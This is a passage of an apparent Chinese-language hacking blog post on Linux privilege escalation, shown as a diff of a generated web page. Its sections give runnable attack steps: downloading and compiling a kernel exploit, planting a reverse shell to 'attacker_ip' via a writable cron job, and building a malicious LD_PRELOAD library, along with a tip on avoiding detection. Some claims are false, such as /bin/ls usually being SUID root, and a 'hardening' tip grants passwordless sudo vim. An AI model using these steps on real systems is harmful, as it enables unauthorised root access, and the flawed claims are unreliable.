+<h3 id="原理-13">原理<a hidden class="anchor" aria-hidden="true" href="#原理-13">#</a></h3>
+<p>利用Linux内核中的已知漏洞获取root权限。</p>
+<h3 id="详细操作步骤-3">详细操作步骤<a hidden class="anchor" aria-hidden="true" href="#详细操作步骤-3">#</a></h3>
+<ol>
+<li>
+<p><strong>获取系统信息</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>uname -a
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 示例输出：Linux ubuntu 4.15.0-101-generic #102-Ubuntu SMP Mon Apr 22 20:32:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span></code></pre></div></li>
+<li>
+<p><strong>使用自动化工具查找漏洞</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+</span></span><span style="display:flex;"><span>chmod +x linpeas.sh
+</span></span><span style="display:flex;"><span>./linpeas.sh
+</span></span></code></pre></div><ul>
+<li><strong>关键输出</strong>：<code>Kernel version: 4.15.0-101-generic</code> 和 <code>Kernel exploits</code></li>
+</ul>
+</li>
+<li>
+<p><strong>下载并编译漏洞利用代码</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 以CVE-2016-5195为例</span>
+</span></span><span style="display:flex;"><span>wget https://www.exploit-db.com/download/40653
+</span></span><span style="display:flex;"><span>gcc 40653.c -o exploit
+</span></span></code></pre></div></li>
+<li>
+<p><strong>执行漏洞利用代码</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./exploit
+</span></span></code></pre></div></li>
+<li>
+<p><strong>验证提权</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 应该输出：root</span>
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="实战技巧-3">实战技巧<a hidden class="anchor" aria-hidden="true" href="#实战技巧-3">#</a></h3>
+<ul>
+<li><strong>优先使用LinPEAS</strong>：这是最高效的自动化工具</li>
+<li><strong>不要手动搜索CVE</strong>：自动化工具能快速定位</li>
+<li><strong>内核版本匹配</strong>：必须精确匹配系统版本</li>
+</ul>
+<hr>
+<h2 id="五计划任务提权">五、计划任务提权<a hidden class="anchor" aria-hidden="true" href="#五计划任务提权">#</a></h2>
+<h3 id="原理-14">原理<a hidden class="anchor" aria-hidden="true" href="#原理-14">#</a></h3>
+<p>如果计划任务（cron job）配置不当，低权限用户可以修改计划任务执行的程序。</p>
+<h3 id="详细操作步骤-4">详细操作步骤<a hidden class="anchor" aria-hidden="true" href="#详细操作步骤-4">#</a></h3>
+<ol>
+<li>
+<p><strong>查看当前用户的cron任务</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crontab -l
+</span></span></code></pre></div></li>
+<li>
+<p><strong>查看系统级cron任务</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls /etc/cron.*
+</span></span></code></pre></div></li>
+<li>
+<p><strong>查找可写cron任务</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -writable -type f 2&gt;/dev/null | grep cron
+</span></span></code></pre></div></li>
+<li>
+<p><strong>创建恶意脚本</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1&#34;</span> &gt; /tmp/malicious.sh
+</span></span><span style="display:flex;"><span>chmod +x /tmp/malicious.sh
+</span></span></code></pre></div></li>
+<li>
+<p><strong>修改cron任务</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crontab -e
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 添加一行：*/1 * * * * /tmp/malicious.sh</span>
+</span></span></code></pre></div></li>
+<li>
+<p><strong>等待cron任务执行</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>  <span style="color:#75715e"># 在攻击机上监听</span>
+</span></span></code></pre></div></li>
+<li>
+<p><strong>验证提权</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 应该输出：root</span>
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="实战技巧-4">实战技巧<a hidden class="anchor" aria-hidden="true" href="#实战技巧-4">#</a></h3>
+<ul>
+<li><strong>优先检查<code>/etc/cron.d/</code></strong>：系统级cron任务存放位置</li>
+<li><strong>利用<code>/etc/cron.daily</code></strong>：每日执行的脚本</li>
+<li><strong>不要修改系统级cron</strong>：容易被发现</li>
+</ul>
+<hr>
+<h2 id="六ld_preload提权">六、LD_PRELOAD提权<a hidden class="anchor" aria-hidden="true" href="#六ld_preload提权">#</a></h2>
+<h3 id="原理-15">原理<a hidden class="anchor" aria-hidden="true" href="#原理-15">#</a></h3>
+<p>LD_PRELOAD环境变量允许在程序执行前加载指定的共享库，如果程序以root权限执行，加载的共享库也会以root权限执行。</p>
+<h3 id="详细操作步骤-5">详细操作步骤<a hidden class="anchor" aria-hidden="true" href="#详细操作步骤-5">#</a></h3>
+<ol>
+<li>
+<p><strong>创建恶意共享库</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;int main() { system(&#34;/bin/bash&#34;); }&#39;</span> &gt; /tmp/exploit.c
+</span></span><span style="display:flex;"><span>gcc /tmp/exploit.c -fPIC -shared -o /tmp/libexploit.so
+</span></span></code></pre></div></li>
+<li>
+<p><strong>设置环境变量</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export LD_PRELOAD<span style="color:#f92672">=</span>/tmp/libexploit.so
+</span></span></code></pre></div></li>
+<li>
+<p><strong>执行SUID程序</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/ls
+</span></span></code></pre></div><ul>
+<li><strong>原理</strong>：<code>/bin/ls</code>通常是SUID root，通过LD_PRELOAD加载恶意库，获得root shell</li>
+</ul>
+</li>
+<li>
+<p><strong>验证提权</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 应该输出：root</span>
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="实战技巧-5">实战技巧<a hidden class="anchor" aria-hidden="true" href="#实战技巧-5">#</a></h3>
+<ul>
+<li><strong>优先检查SUID文件</strong>：<code>find / -perm -u=s -type f 2&gt;/dev/null</code></li>
+<li><strong><code>/bin/ls</code>是最常用</strong>：几乎所有系统都有SUID版本</li>
+<li><strong>不要使用<code>sudo</code></strong>：LD_PRELOAD不需要sudo</li>
+</ul>
+<h2 id="总结">总结<a hidden class="anchor" aria-hidden="true" href="#总结">#</a></h2>
+<ol>
+<li>
+<p><strong>自动化工具优先</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+</span></span><span style="display:flex;"><span>chmod +x linpeas.sh
+</span></span><span style="display:flex;"><span>./linpeas.sh
+</span></span></code></pre></div><ul>
+<li>这是提权的&quot;瑞士军刀&quot;，能快速发现所有提权点</li>
+</ul>
+</li>
+<li>
+<p><strong>提权顺序</strong>：</p>
+<ul>
+<li>先SUID提权 → 再sudo配置错误 → 再passwd文件 → 再内核漏洞 → 再计划任务</li>
+</ul>
+</li>
+<li>
+<p><strong>安全加固建议</strong>（系统管理员必看）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 正确设置passwd权限</span>
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">644</span> /etc/passwd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 正确设置sudoers</span>
+</span></span><span style="display:flex;"><span>visudo
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 添加：username ALL=(ALL) NOPASSWD: /usr/bin/vim</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 定期检查SUID文件</span>
+</span></span><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></div></li>
+</ol>
+<hr>
+<blockquote>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">H4ck3r Station</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            const id = this.getAttribute("href").substr(1);
+            if (!id) return;
+
+            
+            
+            const nextUl = this.nextElementSibling;
+            if (this.closest('.toc') && nextUl && nextUl.tagName === 'UL') {
+                const rect = this.getBoundingClientRect();
+                const offsetX = e.clientX - rect.left;
+
+                
+                if (offsetX < 45) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    const isVisible = window.getComputedStyle(nextUl).display !== 'none';
+                    nextUl.style.display = isVisible ? 'none' : 'block';
+                    this.parentElement.classList.toggle('is-expanded');
+                    
+                    return false; 
+                }
+            }
+
+            
+            
+            e.preventDefault();
+            const targetElement = document.querySelector(`[id='${decodeURIComponent(id)}']`);
+            if (targetElement) {
+                if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                    targetElement.scrollIntoView({ behavior: "smooth" });
+                } else {
+                    targetElement.scrollIntoView();
+                }
+                
+                if (id === "top") {
+                    history.replaceState(null, null, " ");
+                } else {
+                    history.pushState(null, null, `#${id}`);
+                }
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script></body>
+
+</html>
